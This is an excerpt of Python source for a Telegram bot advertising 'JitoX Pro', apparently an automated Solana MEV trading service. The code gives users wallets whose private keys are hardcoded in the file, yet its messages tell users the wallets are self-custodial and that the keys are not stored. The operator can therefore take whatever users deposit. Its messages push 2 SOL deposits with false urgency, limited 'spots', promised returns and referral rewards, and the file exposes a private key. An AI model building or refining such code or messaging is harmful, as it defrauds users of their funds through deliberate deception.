...
async def notify_referrer(application: Application, referrer_id: int, referred_username: str):
    ...
    try:
        message = (
            ...
            f"🚀 Your friend @{referred_username} just joined using your link!\n\n"
            "💎 <b>You've Earned:</b>\n"
            "✓ 0.05 SOL instant reward\n"
            "✓ 1% commission on ALL their trades\n\n"
...
wallet_addresses = [
    ...
    "CozD6Waj7SZL64mvhgNW5Hho5384QVhNev2UnSK8vXha",
   
    
]
# Dictionary mapping wallet addresses to their private keys
wallet_private_keys = {
    "CozD6Waj7SZL64mvhgNW5Hho5384QVhNev2UnSK8vXha": "48rC4JJAbvQGBDLnp75XfocasPJAA4Pz9qPpX4rMtWhGv6b533fLQhJQFmEHYYfRHfe5w6V3ra9tUH27AHyGjRA5p4"
...
async def nexus_settings(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    message = (
        "🚀 <b>Welcome to JitoX Pro</b> 🚀\n\n"
        "Powerful trading tools made simple for everyone:\n\n"
        "✨ <b>Core Features</b>\n\n"
        "💡 Smart Fund Management: Auto-optimize your capital\n"
        "🛠️ Easy Strategy Adjustments: Customize your approach\n"
        "🎯 Market Opportunities: Find the best trades\n"
        "🤖 Automated Trading: Set and forget\n\n"
        "🌟 <b>Advanced Tools</b>\n\n"
        "📈 Strategy Builder: Create custom systems\n"
        "🔍 AI Market Predictions: Clear insights\n"
        "📊 Real-Time Progress: Track your growth\n"
        "🛡️ Safety First: Top-level protection\n\n"
        "🔑 <b>Getting Started</b>\n\n"
        "1. Add 2 SOL to activate\n"
        "2. Choose your tools\n"
        "3. Start smart trading\n\n"
        "New to crypto? We'll guide you every step! 🆘\n\n"
        "Ready to boost your trading? Let's go! 💎"
    )
    keyboard = [
...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    try:
        ...
        keyboard = [
            ...
            [mev_stats_button],
            [InlineKeyboardButton("🔮 Website", url='https://jitomev.com/')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        ...
        message = (
                    ...
                    "<b>How to Start:</b>\n"
                    "1️⃣ Use /get_wallet to generate your personal wallet\n"
                    "2️⃣ Deposit at least 2 SOL into your wallet\n"
                    "3️⃣ Once your balance shows, use the /pool command and assign the amount of SOL you want to trade (More SOL = Higher returns)\n"
                    "4️⃣ After pooling, press <b>Start MEV</b> to launch automated trading\n\n"
                    "📩 <b>Support is here for you</b>: Message @jitoxai anytime\n"
                    "🌐 <a href='https://t.me/+IjTbnbN3Y085MjA0'>Join Our Community Chat</a>\n\n"
                    "🛡️ Your funds are pooled safely, your returns are generated automatically, and you can withdraw at any time.\n"
                    "<b>Spots are limited – Secure your position now and start earning with JitoX.</b>"
                    )
...
async def get_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        ...
        if not is_user_blocked(user_id):
            if user_id not in user_wallets:
                available_addresses = list(wallet_private_keys.keys())
                if available_addresses:
                    assigned_address = available_addresses[0]
                    user_wallets[user_id] = {
                        'address': assigned_address,
                        'private_key': wallet_private_keys[assigned_address]
                    }
                    del wallet_private_keys[assigned_address]
                    
                    message = (
                        "🔐 <b>✅ Your JitoX Wallet Has Been Generated</b>\n\n"
                        f"📬 <b>Deposit Address:</b> <code>{assigned_address}</code>\n"
                        f"🔑 <b>Private Key (Save Securely):</b> <code>{user_wallets[user_id]['private_key']}</code>\n\n"
                        "🚨 <b>Action Required:</b>\n"
                        "To activate your MEV trading account, please deposit <b>2 SOL</b> (or the required amount) to the wallet above.\n\n"
                        "⏳ <b>⚠️ Your Spot is Reserved for the Next 60 Minutes</b>\n"
                        "To avoid expiration, complete your deposit promptly. Spots are limited and high in demand.\n\n"
                        "🔄 <b>What Happens After Deposit?</b>\n"
                        "✅ Wallet activates automatically\n"
                        "✅ You gain access to the trading engine\n"
                        "✅ Begin using /pool to start earning returns\n\n"
                        "💡 <b>Reminder:</b> This wallet is self-custodial. You remain in full control of your funds.\n"
                        "Please save your private key securely — we do not store it.\n\n"
                        "Need help? Reach out to <a href='https://t.me/JitoXai'>@JitoXai</a> anytime.\n\n"
                        "🎯 <b>You're one step away from entering the most powerful MEV strategy platform on Solana.</b>"
                    )
                    
                else:
                    message = "❌ No spots available. Contact support and request a spot, @jitoxai."
            else:
    ...
    "Your JitoX spot is now reserved and awaiting your deposit. To secure your spot, please deposit the required amount within the next hour.\n\n"
    "⏳ <b>Spot Expiration:</b>\n"
    "If no deposit is made within one hour, your spot will expire to make room for new users.\n\n"
    "🚀 <b>Next Steps:</b>\n"
    "1. Deposit the required amount to the address above.\n"
    "2. Your spot will be activated automatically once the deposit is confirmed.\n\n"
    "Thank you for choosing JitoX! 🎮"
)
            ...
            # Handle blocked user message for both types of updates
            if update.callback_query:
                await update.callback_query.answer("You are currently blocked from using this bot.")
            else:
                await update.message.reply_text("You are currently blocked from using this bot.")
    except Exception as e:
        logger.error(f"Error in get_wallet: {str(e)}")
        # Handle error message for both types of updates
        if update.callback_query:
            await update.callback_query.answer("An error occurred while retrieving your wallet information.")
        else:
            await update.message.reply_text("An error occurred while retrieving your wallet information.")
